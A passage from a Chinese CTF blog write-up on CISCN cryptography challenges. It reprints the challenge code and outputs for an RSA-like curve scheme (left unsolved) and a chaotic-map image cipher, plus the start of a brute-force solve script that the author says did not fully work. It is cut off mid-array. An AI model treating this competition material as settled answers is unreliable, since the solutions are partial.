<p>用的是默认的那个字母表，没有keyword，但是第一步出来的没有任何含义，后面是一个栅栏一个凯撒，顺序忘了</p>
<p>我组员当时是手撕的，还拿了一血，呜呜呜，别问我为什么会有这么强的组员，也别问我为什么那么菜还可以当别人组长</p>
<h2 id="move（unsolved）"><a href="#move（unsolved）" class="headerlink" title="move（unsolved）"></a>move（unsolved）</h2><p>（没做出来，有缘再更）</p>
<h3 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h3><img alt="README-a01d6b78.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-a01d6b78.png" width="" height="" >

<img alt="README-5c639665.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-5c639665.png" width="" height="" >

<img alt="README-b653abcd.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-b653abcd.png" width="" height="" >
应该是用到copperSmith

<p>task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(nbit)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    p = get_prime(nbit)</span><br><span class="line">    q = get_prime(nbit)</span><br><span class="line">    <span class="keyword">if</span> q &gt; p:</span><br><span class="line">        p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    bound = <span class="built_in">int</span>(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = random.randint(<span class="number">1</span>, <span class="built_in">round</span>(sqrt(bound)))</span><br><span class="line">        y = random.randint(<span class="number">1</span>, bound) // x</span><br><span class="line">        zbound = <span class="built_in">int</span>(((p - q) * <span class="built_in">round</span>(n ** <span class="number">0.25</span>) * y) // (<span class="number">3</span> * (p + q)))</span><br><span class="line">        z = zbound - ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + zbound) % x</span><br><span class="line">        e = ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + z) // x</span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gifts = [<span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][:<span class="number">22</span>], <span class="number">2</span>), <span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][<span class="number">256</span>:<span class="number">276</span>], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> n, e, gifts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n, e, hint = gen(BITS)</span><br><span class="line">pt = (bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>]), bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]))</span><br><span class="line">c = mul(e, pt)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h1 = <span class="subst">&#123;hint[<span class="number">0</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h2 = <span class="subst">&#123;hint[<span class="number">1</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>output.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">h1 = <span class="number">3518005</span></span><br><span class="line">h2 = <span class="number">641975</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br></pre></td></tr></table></figure>

<h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a>二、解题思路</h3><p>不会了，也截止了</p>
<h2 id="imageencrypt（recuring）"><a href="#imageencrypt（recuring）" class="headerlink" title="imageencrypt（recuring）"></a>imageencrypt（recuring）</h2><p>差一点，解密的时候有点问题，贴下用到的脚本，这里只求理解，确实效率是有点低</p>
<h3 id="一、题目代码"><a href="#一、题目代码" class="headerlink" title="一、题目代码"></a>一、题目代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag,image,r,key1,key2</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>]==<span class="string">&#x27;CISCN&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(r))==<span class="number">3</span>)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,image))</span><br><span class="line"><span class="keyword">assert</span>(flag[<span class="number">6</span>:-<span class="number">1</span>] == md5.new(data).hexdigest())</span><br><span class="line"><span class="keyword">assert</span>(key1&lt;<span class="number">256</span>)</span><br><span class="line"><span class="keyword">assert</span>(key2&lt;<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">x0 = random.random()    <span class="comment"># 产生六位小数</span></span><br><span class="line">x0 = <span class="built_in">round</span>(x0,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel,key1,key2,x0,m,n</span>):</span></span><br><span class="line">    num = m*n/<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 256个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagimage = image</span><br><span class="line">testimage = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    testimage.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"><span class="built_in">print</span>(testimage)</span><br><span class="line"><span class="built_in">print</span>(encrypt(testimage,key1,key2,x0,<span class="number">16</span>,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(encrypt(flagimage,key1,key2,x0,<span class="number">24</span>,<span class="number">16</span>))</span><br></pre></td></tr></table></figure>

<h3 id="二、直接爆破"><a href="#二、直接爆破" class="headerlink" title="二、直接爆破"></a>二、直接爆破</h3><p>主要的思路就是一个一个搞，爆他，首先key1和key2好搞，现在忘了</p>
<p>然后r的话不在下面这三个数之内就没有意义了，你可以试试（你过来呀）</p>
<p>然后我的思路是最简单的爆破，有点慢，但是能出来，当时我用我们队里另外一个队员的电脑同时跑的，他从0开始，我从0.9开始哈哈哈哈哈哈哈，然后我先跑出来了，因为是0.8开始的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">encrypt_flagimage = [<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">encrypt_testimage = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">172</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">201</span>, <span class="number">27</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">23</span>, <span class="number">175</span>, <span class="number">34</span>, <span class="number">156</span>, <span class="number">72</span>, <span class="number">208</span>, <span class="number">32</span>, <span class="number">195</span>, <span class="number">16</span>, <span class="number">127</span>, <span 